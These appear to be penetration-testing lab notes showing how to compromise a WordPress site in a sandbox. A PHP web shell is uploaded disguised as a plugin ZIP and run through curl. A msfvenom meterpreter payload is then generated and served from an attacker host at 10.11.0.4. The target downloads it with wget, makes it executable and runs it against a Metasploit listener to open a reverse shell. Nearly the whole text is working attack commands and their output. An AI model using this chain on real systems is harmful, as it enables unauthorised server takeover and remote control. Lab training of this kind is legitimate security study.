WP expects plugins to be a ZIP. When it receives a ZIP, it will extract it into the **wp-content/plugins** directory on the server. WP places the contents of teh zip into a folder that matches the name of the zip itself. Thus, we need to make note of the name of the file in order to access the PHP shell. 

Create a zip:
`cd /usr/share/seclists/Web-Shells/WordPress`
`sudo zip plugin-shell.zip plugin-shell.php`

Upload in WordPress:
Plugins->Add New->Upload Plugin->Browse->Install Now

Attempt to connect to the shell using curl and a whoami command:
`curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami`
www-data

It works!

Now we will upload a meterpreter payload and obtain a full reverse shell. 

Generate a meterpreter payload:
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf`

Start a webserver to allow target to download the shell:
`sudo python3 -m http.server 80`
This server serves files from the kali user home directory.
Port 80 chosen to avoid firewall issues. 

We will send the target a command to wget our payload from the server, but note that we MUST encode space chars since we can't use spaces in urls. "space" = %20:
`curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=wget%20http://10.11.0.4/shell.elf`

Looking in the Python webserver log, a successful entry would look like:
```
Serving HTTP on 0.0.0.0 port 80 ...
10.11.1.250 - - [09/Dec/2019 19:40:16] "GET /shell.elf HTTP/1.1" 200 -
```

Success! 

Next steps:
- Make shell executable
- Start a metasploit handler on Kali
- Run the elf file on target to aquire a mtrprtr shell

Making shell executable with chmod (Don't forget to encode space and +):
`curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=chmod%20%2bx%20shell.elf`

Start a meterpreter payload listener (one liner):
`sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
set LHOST 10.11.0.4;\
set LPORT 443;\
run"`
**-q** Start quietly
**-x** Start configuring payload handler immediately

With listener up, we need to get a reverse shell by executing shell.elf:
`curl http://sandbox.local/wp-content/plugins/plugin-shell/pluginshell.php?cmd=./shell.elf`

Looking at listener, we can see we have captured a shell.

